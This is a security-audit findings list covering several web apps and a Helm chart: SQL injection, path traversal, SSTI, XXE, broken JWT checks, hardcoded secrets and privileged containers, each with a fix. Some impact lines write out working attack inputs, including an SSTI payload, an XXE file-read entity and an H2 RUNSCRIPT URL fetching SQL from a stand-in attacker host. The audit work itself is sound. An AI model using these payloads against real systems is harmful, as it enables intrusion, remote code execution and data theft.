findings.title: SQL injection in the note search query
findings.evidence: `get '/notes/search'` (app.rb:116) passes `params[:q].to_s` straight to `DB.search`, which interpolates it into the statement with `#{term}` inside two LIKE patterns and interpolates `owner_id` as well; the sibling methods on the same module (`user_by_email`, `note`, `save_note`) all bind with `?`, so the concatenation is not a house style but a gap.
findings.impact: A logged-in user closes the quote and appends a UNION to read any table the SQLite handle can see, including `users.password_digest` and every other tenant's notes; the `owner_id = #{owner_id}` splice means the ownership predicate is itself part of the injectable string.
findings.recommendation: Bind the term as a parameter and build the wildcards outside SQL: `handle.execute("... WHERE owner_id = ? AND (title LIKE ? OR body LIKE ?) ...", [owner_id, "%#{term}%", "%#{term}%"])`.

findings.title: Path traversal and missing ownership check in GET /download
findings.evidence: `name = params[:name].to_s` is joined onto `Attachments::ROOT` and handed to `send_file` with no canonicalisation and no comparison against the base directory. `Attachments.store` writes under `ROOT/<owner_id>/<sha256><ext>`, but the download path never re-derives the owner segment from the session.
findings.impact: `?name=../../etc/passwd` reads any file the app process can open, including `data/hearth.db` with every bcrypt digest. Even without traversal, `?name=<other_uid>/<digest>.pdf` serves another tenant's attachment, because the only thing the handler checks is that somebody is logged in.
findings.recommendation: Resolve the joined path with `File.realpath` and reject it unless it starts with `File.realpath(ROOT)`, and force the owner segment from `current_user['id']` rather than accepting it inside `name`; better still, look the attachment up by a stored id and derive the path server-side.

findings.title: Session cookies signed with a signing secret committed in the source
findings.evidence: `set :session_secret, 'hearth-notes-session-secret-v2'` is a literal in the application file; Sinatra passes it to Rack::Session::Cookie, which is the only integrity protection on the session. Nothing reads an environment variable as an override, and the `-v2` suffix suggests the constant has already survived one rotation.
findings.impact: Anyone who reads this self-hosted project's source can mint a cookie carrying `uid` of any account, including one whose `role` is `admin`, and walk past `require_login!` and the `/admin/*` gate without a password. The compromise is silent and leaves no failed-login trace.
findings.recommendation: Read the secret from the environment and refuse to boot without it (`ENV.fetch('HEARTH_SESSION_SECRET')`), rotate the current value, and treat every existing session as invalid.

findings.title: Stored XSS: note markdown is rendered with HTML filtering disabled and emitted unescaped
findings.evidence: The Redcarpet renderer is built with `filter_html: false, escape_html: false` and no `safe_links_only`, and `views/note.erb:6` prints the result through `<%== body_html %>`, the one raw-output tag in a template set that otherwise relies on `escape_html: true`. Note bodies come from `params[:body]` at app.rb:128 with no sanitisation between input and sink.
findings.impact: A note body containing `` or a `javascript:` link executes in the session of whoever opens the note. Today `DB.note` scopes reads to the owner, so the reachable case is self-XSS plus anyone who can plant a note in another account (the forged session cookie above does exactly that); any future sharing, export or admin preview turns it into stored XSS against other users.
findings.recommendation: Render with `filter_html: true, escape_html: true, safe_links_only: true`, or pass the Redcarpet output through an allowlist sanitiser before the template, and keep the raw-output tag only for markup the server produced.

findings.title: Open redirect through the post-login `next` parameter
findings.evidence: `destination = params[:next].to_s` is passed to `redirect` with no check that it is a local path. Sinatra's `uri` helper returns any value that already carries a scheme unchanged, so an absolute URL is emitted verbatim in the `Location` header. The value round-trips through the login form's hidden field, so it survives the credential prompt.
findings.impact: `/login?next=https://attacker.example/hearth` renders a genuine, correctly-branded sign-in page and lands the user on the attacker's host immediately after a successful authentication - the highest-credibility moment for a credential-replay or token-handoff phish.
findings.recommendation: Accept only same-site targets: reject anything that does not match `\A/[^/\\]` (which also rules out protocol-relative `//host`), or keep an allowlist of named destinations and pass the key rather than the URL.

findings.title: Session cookie is issued without the Secure attribute
findings.evidence: The session options set `httponly: true` and `same_site: :lax` but omit `secure: true`, and nothing else in `config.ru` or the app forces HTTPS (no `Rack::SSL`, no HSTS header).
findings.impact: The authenticated session cookie is attached to any plaintext request to the same host, so a single downgraded or mistyped `http://` navigation on a shared network hands over the session. HttpOnly and Lax do not prevent this.
findings.recommendation: Add `secure: true` to the session options (driven by the environment for local development), and emit `Strict-Transport-Security` from the app or its reverse proxy.

findings.title: Shell command built by interpolation in the legacy archive importer
findings.evidence: `system("tar xf #{archive_path} -C #{dest}")` passes a single string to the shell, so `;`, `|`, `$( )` and backtick metacharacters in `archive_path` are interpreted. A repository-wide search for `legacy_import` returns only this definition - no route or job calls it today - but the method is public on a module the app requires at boot.
findings.impact: Any future caller that reaches this with a client-influenced path gets command execution as the application user. `tar xf` with no `--no-absolute-names` or path validation additionally extracts entries that escape `dest` (tar-slip).
findings.recommendation: Delete the method, or replace it with an argument-vector call (`system('tar', 'xf', archive_path, '-C', dest)`) plus per-entry path validation on extraction.

findings.title: Authentication bypass: a JWT that fails verification is accepted after an unverified decode
findings.evidence: `attachPrincipal` calls `verify(raw)` inside a `try`, and the `catch` arm assigns `req.principal = identify(raw)`. `identify` (auth/token.js:31) is `jwt.decode(token)` - no key, no algorithm list, no `exp`, no `iss` - and returns `{id, org, role}` straight from the payload. `requireSession` (server.js:62) then only tests that `req.principal` is truthy, and every resolver reads `ctx.user.id`/`ctx.user.org` as authority. This is `WEB-27`: the control runs on every request and has no path that says no.
findings.impact: An unauthenticated caller sends any base64url payload with a `sub` and a deliberately wrong signature; verification throws, the fallback succeeds, and the request is authorised as that subject with a self-chosen `org` and `role`. It is total authentication bypass and cross-tenant access in one step, and it is easier to trigger than a valid token because the exception path is the goal.
findings.recommendation: Delete the fallback: a failed `verify` must yield 401. Handle expiry by having the console refresh against the refresh endpoint - if a grace window is genuinely required, verify the signature and issuer normally and relax only `exp` (`jwt.verify(raw, SECRET, {algorithms:['HS256'], issuer:ISSUER, ignoreExpiration:true})` bounded by a hard maximum age).

findings.title: SQL injection in the report search resolver
findings.evidence: `args.term` is declared `String!` (schema.graphql:46), so it is arbitrary text, and it is interpolated with `${args.term}` into two ILIKE patterns while `org_id` in the same statement is correctly bound as `$1`. The mixed style in one query shows the binding mechanism was available and not used.
findings.impact: Any caller who reaches the resolver - which, given the authentication bypass above, is anyone at all - closes the quote and appends a subquery or UNION to read `users.reset_token`, `users.email` and every other organisation's reports out of the same connection.
findings.recommendation: Bind the term: `... AND (title ILIKE $2 OR description ILIKE $2) ...` with `['%'+term+'%']` as the second parameter, and grep the tree for the remaining template-literal query bodies.

findings.title: Password-reset tokens are exposed on the User type to every member of the organisation
findings.evidence: `MEMBER_COLUMNS` selects `reset_token`, `toUser` maps it to `resetToken`, and `schema.graphql:14` publishes `resetToken: String` on `User`. `orgMembers` returns that mapping for every row with the caller's `org_id`, with no role predicate; the comment says the column is fetched so the console can render a "reset pending" pill, which needs a boolean, not the token.
findings.impact: The lowest-privileged principal in the org queries `{ orgMembers { email resetToken } }` and receives live password-reset tokens for every colleague, owners included, then completes the reset flow as them. A VIEWER escalates to owner without touching authentication.
findings.recommendation: Remove `resetToken` from the schema and from `MEMBER_COLUMNS`; if the pill is needed, expose a derived `resetPending: Boolean` computed from `reset_token IS NOT NULL` and never return the token itself.

findings.title: No function-level authorization on the user-management mutations
findings.evidence: `deactivateUser` and `inviteUser` read `ctx.user.org` and `ctx.user.id` but never consult `ctx.user.role`; there is no directive, no middleware and no service-layer check anywhere in the resolver files. The comment above `deactivateUser` states the enforcement outright - "the console only renders the 'deactivate' control for owners" - which is `WEB-05`'s vulnerable pattern verbatim: the role check lives in the frontend.
findings.impact: Any principal with a session, including one whose role is VIEWER, can deactivate any user in the organisation - the owner included, locking the org out of its own account - and can create new MEMBER accounts through `inviteUser`, whose returned object also carries the new user's reset token.
findings.recommendation: Gate both mutations on the caller's role server-side (a shared `requireRole('OWNER')(ctx)` executed before the query), and make the deny path the default for any new mutation rather than something each resolver opts into.

findings.title: JWT signing key falls back to a constant committed in the source
findings.evidence: `const SECRET = process.env.JWT_SECRET || 'pulsedeck-local-signing-key'` - both `issue` and `verify` use it, and no startup check asserts the variable is present. The same repository shows it knows better: `analytics.js:13-16` throws `ANALYTICS_SECRET is not set; refusing to emit events` rather than substituting a default.
findings.impact: A deployment that loses or misspells `JWT_SECRET` silently signs and accepts tokens under a string published in the repository, so anyone can forge a token for any `sub`, `org` and `role`. The failure is invisible - the service starts, logs nothing and serves traffic normally.
findings.recommendation: Fail closed at module load: read `process.env.JWT_SECRET` and throw if it is unset or shorter than 32 bytes, the way `signBatch` already does; rotate the constant out of history.

findings.title: TLS certificate validation disabled on the PostgreSQL connection
findings.evidence: `ssl: { rejectUnauthorized: false }` on the pg Pool. The accompanying comment states the reason - the provider's internal CA is not in the container trust store - which confirms the setting is deliberate and shipped rather than a development leftover.
findings.impact: The connection is encrypted but unauthenticated: anything that can answer for `pulsedeck-primary.internal` (DNS drift, a compromised sidecar, a rerouted overlay) presents its own certificate and receives the `PGUSER`/`PGPASSWORD` credentials plus every query and result in the clear to it.
findings.recommendation: Ship the provider's CA into the image or the pod and set `ssl: { ca: fs.readFileSync(process.env.PG_CA_PATH), rejectUnauthorized: true }`; pinning the CA is what the comment's problem actually calls for.

findings.title: GraphQL endpoint has no query cost, depth or operation limit and no rate limiting
findings.evidence: `new ApolloServer({ typeDefs, resolvers })` is constructed with no validation rules, no depth or complexity plugin and no persisted-query allowlist; the express stack is `bodyParser`, `attachPrincipal`, `requireAllowedOrigin`, `cors`, `requireSession` - no limiter anywhere. The only bound in the request path is the 256kb body limit.
findings.impact: One 256kb document can carry several hundred aliased `searchReports` selections, each running an unanchored `ILIKE '%...%'` scan over the reports table on a pool capped at 12 connections; alias batching multiplies cost without multiplying request count, so a per-request limit would not have caught it either.
findings.recommendation: Add a complexity or depth validation rule and an operations-per-document cap, and put a per-principal rate limiter in front of `/graphql`; persisted queries in production remove the class entirely.

findings.title: SQL injection in the retained legacy rollup helper
findings.evidence: `WHERE tenant = '${tenantName}'` with no binding, in a function that is exported on line 58 (`module.exports = { pool, query, withTransaction, legacyRollupByTenant }`). No resolver imports it today - the comment says a nightly job still expects the old column names - so the sink is live in the package but not reachable from the GraphQL surface in this tree.
findings.impact: Any current or future caller that passes a tenant name from outside gets full injection on the same connection pool the API uses. Because it is exported rather than module-private, the caller may live outside the files audited here.
findings.recommendation: Bind the parameter (`WHERE tenant = $1`, `[tenantName]`) even while the function is on its way out, and drop it from the exports until the nightly job is retired.

findings.title: Delivery-callback signature verification returns true when the signature header is absent
findings.evidence: `if not provided:` logs "callback arrived unsigned, accepting" and returns `True`. Everything below it - timestamp tolerance, `hmac.compare_digest` - is correct and is simply skipped by omitting the header. The test suite reinforces the gap: `test_garbage_header_is_rejected` supplies `"??"`, which is a *present* header, so no test covers the missing-header branch. This is `WEB-27`: the control runs, and the cheapest input makes it unable to fail.
findings.impact: The handler is wired to a public API Gateway route (`template.yaml:126-129`, `POST /callbacks/delivery`) with no authorizer, so anyone on the internet posts `{"messageId": ..., "state": "delivered", "carrier": "northwind"}` with no header at all and writes forged delivery state into the mail store. Message ids are attacker-chosen, so the object key is too.
findings.recommendation: Make a missing header a rejection: `if not provided: return False`. If sandbox tenants genuinely cannot sign, gate that on `config.STAGE != 'prod'` (or `config.is_local()`, which already exists and has no callers) rather than on the header being absent.

findings.title: Server-side template injection through inlineTemplate on an unauthenticated function URL
findings.evidence: `Template(source).render(**ctx)` compiles a request field as a Jinja2 template in a fresh, unsandboxed Environment - it does not go through `_env`, so it has neither the autoescape nor the loader constraints. `handler` line 70 takes that branch whenever `payload.get('inlineTemplate')` is truthy, which bypasses `TEMPLATE_REGISTRY` entirely; `config.py:12-14` claims "A request that names anything outside this table is rejected before a path is built", and this branch never consults the table. The function is exposed by `template.yaml:107-108` with `AuthType: NONE`.
findings.impact: An unauthenticated caller posts `{"messageKey": "...", "inlineTemplate": "{{ ''.__class__.__mro__[1].__subclasses__() }}"}` and reaches Python object traversal inside the Lambda: environment variables (including `MAILROOM_SIGNING_SECRET`), the execution-role credentials from the runtime, and arbitrary code in the function's context. The `Cors.AllowOrigins` entry constrains browsers only and does nothing to a direct request.
findings.recommendation: Remove the inline branch. If customer-authored snippets must be previewed, render them in `jinja2.sandbox.SandboxedEnvironment` with autoescape on, behind authentication and a per-workspace authorization check, and never in the same function that holds the signing secret.

findings.title: Unauthenticated read of any object in the mail store through the render handler
findings.evidence: `message_key = payload.get('messageKey')` is checked only for emptiness and passed to `storage.get_object`, which calls `s3.get_object(Bucket=MAIL_BUCKET, Key=key)` with no prefix constraint, no tenant scoping and no caller identity - the function URL is `AuthType: NONE` (template.yaml:108) so there is no principal to scope against. The retrieved bytes are returned to the caller inside the rendered HTML via `ctx['body']`.
findings.impact: Anyone who learns the function URL reads any key in the bucket: `raw/<messageId>.eml` for other tenants' inbound mail, `raw/callbacks/*.json`, and anything the archival crawler leaves there. Message ids are also chosen by the webhook caller, so keys are guessable rather than secret.
findings.recommendation: Put the function behind IAM or an authorizer, derive the tenant from the authenticated principal, and constrain the key to a server-built prefix for that tenant instead of accepting it from the body.

findings.title: Production webhook signing secret hardcoded in the SAM template
findings.evidence: `MAILROOM_SIGNING_SECRET: mrs_7d41c0a9e2b84f60a1c35de8f9b21047` sits under `Globals`, so it is injected into all three functions in every stage, prod included (`samconfig.toml:16` sets `Stage="prod"`). The comment - "Rotated by hand each quarter; the delivery partner signs callbacks with the same value" - identifies it as the live shared secret, and it is a different value from the documented sandbox secret in the test file. The template also declares `InboundFunction` with `secretsmanager:*`, so a secret store is available and is not being used for this.
findings.impact: Anyone with repository read access can sign valid delivery callbacks, and rotation requires a code change and a redeploy. The value is additionally visible in the Lambda console to every principal with `lambda:GetFunctionConfiguration`.
findings.recommendation: Move it into Secrets Manager or an SSM SecureString, reference it by ARN, fetch it at cold start, and rotate the exposed value with the carrier.

findings.title: Inbound function granted s3:* and secretsmanager:* on every resource
findings.evidence: The inline statement is `Action: ['s3:*', 'secretsmanager:*']` with `Resource: '*'` and no condition. The other two functions in the same template show the intended granularity: `RenderFunction` uses `S3ReadPolicy` scoped to `!Ref MailStore` and `WebhookFunction` uses `S3WritePolicy` scoped the same way, so the wildcard is an outlier and not a house convention.
findings.impact: The function reads, writes and deletes every bucket in the account and reads every secret, including ones belonging to unrelated stacks. Any code-execution or SSRF foothold in this function - and the same directory ships an `eval` and an unvalidated outbound fetch - becomes account-wide credential theft.
findings.recommendation: Replace with the scoped SAM policy templates already used by the siblings (`S3CrudPolicy: {BucketName: !Ref MailStore}`) plus a `secretsmanager:GetSecretValue` statement naming the one secret ARN it needs.

findings.title: Attachment filename from the MIME part builds the write path without validation
findings.evidence: `target = os.path.join(config.TMP_ROOT, filename)` where `filename` is `part.get_filename()` from the inbound message (inbound.py:42-46) or `pointer['name']` from the notification (inbound.py:61). There is no `os.path.basename`, no normalisation and no containment check; line 40 then calls `os.makedirs(os.path.dirname(target))`, which deliberately creates whatever parent the name implies. `os.path.join` discards `TMP_ROOT` entirely when the name is absolute.
findings.impact: A sender names an attachment `../evil.sh` or `/tmp/x/y` and the bytes land outside `/tmp/mailroom`. `clear_scratch` only walks `TMP_ROOT`, so those files survive; Lambda reuses execution environments, so the write persists into later invocations and can pre-place a file at a path a downstream tool (the scanner and thumbnailer the docstring names) later reads.
findings.recommendation: Derive the stored name server-side - a hash or uuid plus a validated extension - and if the original name must be kept, take `os.path.basename`, strip separators and assert `os.path.realpath(target).startswith(os.path.realpath(TMP_ROOT) + os.sep)` before opening.

findings.title: Attacker-controlled attachment filename written into CloudWatch without neutralisation
findings.evidence: `log.info("staged attachment %s (%d bytes)", target, len(body))` - flagged UNCLEARED by `log_escaper.py`, which reports 2 logging calls in this tree with 1 uncleared. `target` embeds `part.get_filename()`, which comes from an inbound email and can contain CR/LF; the Lambda logger emits line-oriented text and CloudWatch splits records on newlines. Deferred `%s` formatting does not neutralise the value, only the interpolation site.
findings.impact: Anyone who can send mail to the ingest address writes fabricated log records - an authorship and accountability loss on the log an operator reads to reconstruct an incident, and a fabricated prefix for any alerting rule that matches on one.
findings.recommendation: Neutralise before logging (`filename.encode('unicode_escape').decode()` or an explicit CR/LF strip), or emit structured JSON records and confirm the consumer parses that format rather than lines.

findings.title: Attachment URL from the notification is fetched with no scheme or destination allowlist
findings.evidence: `SESSION.get(url, timeout=10, stream=True)` where `url` is `pointer['url']` taken from `note.get('attachmentUrls', [])`, i.e. from the JSON body of the SNS message, with no host allowlist, no scheme check and redirects left at the requests default of enabled. `attachmentUrls` is not a field SES emits, so its contents are shaped by whatever publishes to the topic.
findings.impact: Requests are issued from the function's network position to any HTTP(S) host an SNS publisher names, following redirects. The blast radius is bounded here - the function has no VPC configuration, so no private subnet is reachable, and Lambda exposes no instance metadata service - so this is reconnaissance and egress abuse rather than credential theft. The bound rests on the topic's publisher set, which is not in the files audited.
findings.recommendation: Validate the URL against the expected SES attachment host before fetching, disable redirect following (`allow_redirects=False`) or re-validate after each hop, and require https.

findings.title: eval() on a queue payload in the retained replay path
findings.evidence: `note = eval(queue_body)` - the docstring explains the old queue carried a Python literal rather than JSON. No caller exists in this tree, but the function ships inside the deployment package (`CodeUri: src/`) and is importable from the same module the SNS handler lives in.
findings.impact: Whatever replay tooling is pointed at this executes arbitrary Python with the function's execution role - which, for `InboundFunction`, is the `s3:*` plus `secretsmanager:*` role above.
findings.recommendation: Delete it, or replace with `ast.literal_eval`, which parses the same Python literals without evaluating anything.

findings.title: H2 console enabled, remotely reachable and permitted without authentication in the production profile
findings.evidence: `enabled: true`, `path: /h2-console` and `settings.web-allow-others: true` sit in the top document, not in the `on-profile: local` document below (line 63) - so they apply under `profiles.active: prod` (line 5). `SecurityConfig.java:70` then adds `.requestMatchers(toH2Console()).permitAll()`, line 65 disables CSRF and line 67 relaxes frame options to `sameOrigin`. The H2 driver is a runtime dependency (`pom.xml:47-51`), so the console servlet auto-configures regardless of the production datasource being PostgreSQL.
findings.impact: An unauthenticated request to `/h2-console` reaches a database console that lets the caller type any JDBC URL - the PostgreSQL URL and credentials from lines 7-9 of this same file, or an H2 URL with `INIT=RUNSCRIPT FROM 'http://attacker/x.sql'`, which is remote code execution in the service JVM. `web-allow-others: true` removes the loopback-only restriction that would otherwise limit it.
findings.recommendation: Move the whole `spring.h2.console` block into the `local` profile document, drop the `toH2Console()` permitAll from the production chain, and scope the H2 dependency to `test` so it cannot auto-configure in production.

findings.title: XXE in the wholesale order feed importer
findings.evidence: `DocumentBuilderFactory.newInstance()` is used with no `disallow-doctype-decl`, no `external-general-entities`/`external-parameter-entities` set to false and no `FEATURE_SECURE_PROCESSING`; line 43 goes the other way and sets `setExpandEntityReferences(true)` explicitly, with a comment explaining that older feeds pull tables in from a shared entity file. The parsed document is reached from `POST /api/orders/import` (OrderController.java:107-110), whose body is the raw XML.
findings.impact: `<!DOCTYPE feed [<!ENTITY x SYSTEM "file:///etc/passwd">]>` with `&x;` inside `<shippingAddress>` writes the file's contents into the orders table, from which `GET /api/orders/{id}` reads it back - and that handler has no org scoping, so retrieval needs no matching tenant. External parameter entities give the same primitive against internal HTTP endpoints from the service's network position, and a nested-entity document is an unauthenticated-cost memory exhaustion.
findings.recommendation: Set `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` (and `setXIncludeAware(false)`, `setExpandEntityReferences(false)`); if the shared entity file is genuinely required, resolve it with a fixed `EntityResolver` that serves that one document from the classpath and rejects every other system id.

findings.title: Order feed can overwrite any order in any organisation
findings.evidence: `order.setId(Long.parseLong(text(element, "id")))` takes the primary key from the feed, and `orders.update(order)` issues `UPDATE orders SET ... WHERE id = ?` (OrderRepository.java:79) - the WHERE clause has no `org_id` term. `order.setOrgId(orgId)` on line 57 sets the field on the object, but `update` never reads `getOrgId()`, so the caller's organisation is never part of the predicate. Every other write path in the controller pre-checks with `findByIdAndOrgId`; this one does not. This is `WEB-25`: the authorization was applied to the caller, never to the rows the body names.
findings.impact: A tenant with the OPS role posts a feed naming another tenant's order ids and rewrites their `customerRef`, `totalCents`, `currency`, `shippingAddress`, `internal_note` and `status` - silent cross-tenant tampering of a financial ledger, with the victim's `org_id` left intact so the rows still look like theirs.
findings.recommendation: Add `AND org_id = ?` to `OrderRepository.update` and pass `order.getOrgId()`, so no caller can reach a row outside its tenant; treat a zero-row update as a rejected feed entry rather than a silent no-op.

findings.title: GET /api/orders/{id} is neither org-scoped nor token-verified, unlike its sibling handlers
findings.evidence: Two asymmetries in one signature. It calls `orders.findById(id)` while `update` (line 72) and `note` (line 87) call `orders.findByIdAndOrgId(id, caller.orgId())` on the same resource. And it is the only handler in the class whose parameter list omits `CallerContext` - `SecurityConfig.resolve()` (line 77), the sole place any JWT signature, issuer or audience is checked in this application, runs from the `CallerContext` argument resolver (line 128), so for this endpoint it never runs at all.
findings.impact: An order id is a sequential long: incrementing it walks the whole table across every tenant, returning `shippingAddress` (customer PII), `totalCents` and `internalNote`. It is also the read-back for the XXE above. Because token parsing is skipped on this path, no claim of the caller's is examined here.
findings.recommendation: Change the handler to take `CallerContext caller` and call `findByIdAndOrgId(id, caller.orgId())`, returning 404 on a miss; then remove `findById` from the repository so the unscoped lookup cannot be reintroduced.

findings.title: Production database password committed in application.yml
findings.evidence: `password: 0rd3rb00k-app-2024` alongside `url: jdbc:postgresql://orderbook-db.internal:5432/orderbook` and `username: orderbook_app`, in the default document that `profiles.active: prod` selects. It is a literal, not a `${...}` placeholder - the same file's `local` document shows the placeholder-free style is deliberate. `SecurityConfig` reads its JWT key from `System.getenv`, so the project has an environment-based path it did not use here.
findings.impact: Anyone with repository or build-artifact access holds working credentials to the production ledger database, from any host that can route to `orderbook-db.internal`. The value is also readable through `/actuator/heapdump`, which the finding below leaves reachable.
findings.recommendation: Replace with `${DB_PASSWORD}` sourced from the environment or a secret manager, rotate the credential, and add a secret scanner to the build so a literal cannot land in a properties file again.

findings.title: Every actuator endpoint is exposed, including env and heapdump
findings.evidence: `include: "*"` publishes the full endpoint set under `/actuator`. `SecurityConfig.java:69` permits `/actuator/health` and `/actuator/info` anonymously and `anyRequest().authenticated()` covers the rest - so `env`, `configprops`, `heapdump`, `threaddump`, `beans`, `mappings` and `loggers` are reachable by any principal the filter chain treats as authenticated, with no role requirement. `show-details: when-authorized` limits only the health payload.
findings.impact: `/actuator/heapdump` returns the JVM heap, which is not subject to the sanitisation applied to `/actuator/env` - it carries the `ORDERBOOK_JWT_KEY` HMAC material and the datasource password in cleartext, so one download turns any caller into a token minter. `/actuator/loggers` additionally lets a caller switch `org.hibernate.SQL` to DEBUG at runtime.
findings.recommendation: Set `include: health,info,metrics,prometheus`, keep `heapdump` and `threaddump` off entirely, and put whatever remains behind a dedicated management port bound to the internal network with its own role requirement.

findings.title: The token's roles never reach Spring Security, so the staff-only gates are not enforced by the credential that carries them
findings.evidence: The chain requires `hasRole("OPS")` on `GET /api/orders/export` and `POST /api/orders/import`, but nothing in the chain authenticates: there is no `oauth2ResourceServer`, no `httpBasic`, no `addFilterBefore` and no custom `AuthenticationProvider`. The only JWT handling is `resolve()` (line 82), invoked from a `HandlerMethodArgumentResolver` (line 128) that runs in Spring MVC after the security filters and populates a `CallerContext` record (line 134) - never a `SecurityContext` authority. `claims.get("roles")` is read on line 93 and used by nothing.
findings.impact: Authorization and the credential are on two different code paths. Either no principal is ever authenticated and the role matchers can never pass, or a principal is established by a mechanism outside these files, in which case its authorities are unrelated to the `roles` claim the token carries and the OPS gate is decided by something other than the token. Both readings mean the declared staff-only restriction on the ledger export and the XML import is not enforced by the JWT. Which one holds cannot be settled from this tree.
findings.recommendation: Authenticate inside the filter chain - a `OncePerRequestFilter` (or `oauth2ResourceServer().jwt()`) that runs `resolve()` and sets an `Authentication` whose authorities are `ROLE_` + each roles entry - and derive `CallerContext` from that authentication rather than re-parsing the header at argument-resolution time.

findings.title: Order update binds the request body onto the record, and the terminal-state rule is enforced nowhere
findings.evidence: `@RequestBody Order incoming` binds the persistence model directly; the handler overwrites only `id` and `orgId` from the looked-up record and passes everything else - `status`, `totalCents`, `currency`, `customerRef`, `internalNote` - to `orders.update`. There is no transition check: `OrderStatus.isTerminal()` (model/OrderStatus.java:17) is declared and has zero readers anywhere in the tree, so the one invariant the model states is a constant nothing consults.
findings.impact: A caller with access to one of its own orders sets `totalCents` to any value and moves `status` directly to `DELIVERED` or back out of `CANCELLED`, bypassing the picking and packing states entirely - a settlement and fulfilment-fraud primitive against a double-entry ledger, and the `isTerminal` guard that was written for exactly this never fires.
findings.recommendation: Bind a request DTO carrying only the fields a client may change, keep `totalCents` and `status` off it, and route status changes through a transition method that consults `isTerminal()` and a declared allowed-transitions map, rejecting anything else.

findings.title: Unverified JWT parser retained in the security configuration class
findings.evidence: `Jwts.parser().build().parseUnsecuredClaims(payload)` - no `verifyWith`, no issuer or audience requirement - builds the same `CallerContext` record that the verified path produces, with `org` and `roles` read straight from the base64 payload the caller supplied. It is `@Deprecated` and package-private with no callers in this tree, but it is compiled into the shipped jar and sits in the class the argument resolver already delegates to.
findings.impact: Two methods on one class return an identical authorization object, one after checking a signature and one without. A single-line change at the resolver - the exact kind a gateway migration invites - turns every claim in the token into caller-supplied data.
findings.recommendation: Delete the method; the gateway it served no longer exists, and the deprecation annotation is not a control.

findings.title: Application container runs privileged with no security context hardening
findings.evidence: The container's securityContext is `privileged: true` and `readOnlyRootFilesystem: false`, with no `runAsNonRoot`, no `runAsUser`, no `allowPrivilegeEscalation: false`, no `capabilities.drop` and no `seccompProfile`; the pod-level context sets only `fsGroup: 10001`. The justification in the comment - the reconciler needs the node's snapshotter - describes a nightly job, while this is the always-on API Deployment (`replicas: 3`).
findings.impact: A privileged container holds all capabilities and an unmasked `/proc` and `/sys`, so any code execution in the ledger service is a container escape to root on the node and, from there, to every workload scheduled there. This is also the pod that terminates the public ingress path.
findings.recommendation: Drop `privileged` from the Deployment and add `runAsNonRoot: true`, `allowPrivilegeEscalation: false`, `capabilities: {drop: [ALL]}`, `readOnlyRootFilesystem: true` and a `RuntimeDefault` seccomp profile; if snapshotting genuinely needs node access, put it in the separate CronJob it belongs to with only the capabilities that operation requires.

findings.title: Host Docker socket mounted into the always-on ledger pod
findings.evidence: `hostPath: {path: /var/run/docker.sock, type: Socket}` mounted at `/var/run/docker.sock`, gated by `reconciler.mountDockerSocket`, which `values.yaml:48` sets to `true` by default. The value name and the comment above it refer to the nightly reconciliation job, but the `{{- if }}` is inside the Deployment's pod template - and there is no CronJob template in this chart at all (`reconciler.schedule` has no reader).
findings.impact: Write access to the Docker socket is equivalent to root on the node with no exploit required: a caller runs a container with the host filesystem mounted, or reads every other container's image and environment. Combined with `privileged: true` on the same container, a single application compromise takes the node and every credential scheduled on it.
findings.recommendation: Set `mountDockerSocket: false` and remove the volume from the long-running Deployment; if a filesystem snapshot is genuinely needed, use a CSI VolumeSnapshot or a dedicated job with its own restricted ServiceAccount, never the container runtime socket.

findings.title: Bootstrap admin password shipped as a literal environment value in the chart
findings.evidence: `- name: LEDGER_ADMIN_PASSWORD` / `value: "r3conc1le-op-2024!"` - a literal `value:`, four lines below `LEDGER_DB_PASSWORD`, which the same container correctly sources through `valueFrom.secretKeyRef`. The comment identifies it as the built-in operator account the reconciler signs in with before the IdP is reachable, i.e. an account that works when the identity provider does not.
findings.impact: The credential for a break-glass operator account is in the chart, in the rendered manifest, in the pod spec readable by anyone with `get pods` in the namespace, and in every Helm release secret. It authenticates precisely when the IdP - and therefore any central revocation - is unavailable.
findings.recommendation: Move it into the existing vault-injected Secret beside the database password and reference it with `valueFrom.secretKeyRef`, rotate the value, and give the bootstrap account an expiry so it cannot outlive the bootstrap.

findings.title: TLS verification disabled on the clearing-house connection
findings.evidence: `insecureSkipTLSVerify: true` is rendered into the container as `LEDGER_UPSTREAM_INSECURE` (deployment.yaml:53-54). The comment states the reason - the partner's appliance presents a certificate from their own CA - and chooses skipping the check over shipping that CA into the image.
findings.impact: The hop that carries settlement traffic to `clearing.partner.example` is encrypted but unauthenticated. Anything that can answer for that name - DNS drift, a compromised egress hop, a rerouted overlay - reads and rewrites clearing instructions and harvests whatever credential the ledger presents. "Traffic is still encrypted" is true and does not address who it is encrypted to.
findings.recommendation: Mount the partner's CA (a ConfigMap or the existing Vault path) and have the client trust that specific root, or pin the leaf's public key; keep `insecureSkipTLSVerify` available only under a non-production values file.

findings.title: Setting nameOverride silently detaches the NetworkPolicy and the Service from the pods
findings.evidence: The Deployment hardcodes its pod labels as `app.kubernetes.io/name: ledger` (line 22) and `spec.selector.matchLabels` the same way (line 17), while `service.yaml:9-10` and `networkpolicy.yaml:7-9` build their selectors from `include "ledger.selectorLabels"`, which resolves to `{{ default "ledger" .Values.nameOverride }}` (_helpers.tpl:5). `nameOverride` is a documented top-level value (values.yaml:1); it agrees with the hardcoded label only while it is empty.
findings.impact: Any release that sets `nameOverride` renders a NetworkPolicy whose podSelector matches nothing. A pod selected by no policy accepts traffic from every pod in the cluster, so the gateway-only restriction - the sole thing keeping the profiling port and the API off the cluster network - disappears, and the chart reports success. The Service selector breaks in the same step, so the failure surfaces as an outage whose obvious fix does not restore the policy.
findings.recommendation: Render the pod template labels from `include "ledger.selectorLabels" .` like every other object in the chart, so all three selectors move together; add a `helm template --set nameOverride=x` check to CI asserting the policy's podSelector matches the Deployment's pod labels.

findings.title: Profiling and expvar port published by the Service
findings.evidence: `debug.pprofEnabled: true` (values.yaml:41) both sets `LEDGER_PPROF` in the container and adds a `debug` port on the Service (service.yaml:16-20) targeting containerPort 6060. The NetworkPolicy admits only `.Values.service.port` (networkpolicy.yaml:25), so 6060 is not in the allowed ingress set - the exposure is bounded by that one policy.
findings.impact: `/debug/pprof` yields heap and goroutine dumps - in a ledger process that means balances, tokens and connection strings resident in memory - and `/debug/pprof/profile` blocks a CPU for its duration. The only thing standing in front of it is a NetworkPolicy that a values flag turns off and that the label mismatch above can silently void, so the port has no defence of its own.
findings.recommendation: Default `pprofEnabled` to false, keep the debug listener bound to localhost and reach it with `kubectl port-forward` when a profile is needed, and stop publishing the port on the Service.

findings.title: Privileged break-glass pod spec retained as a chart template
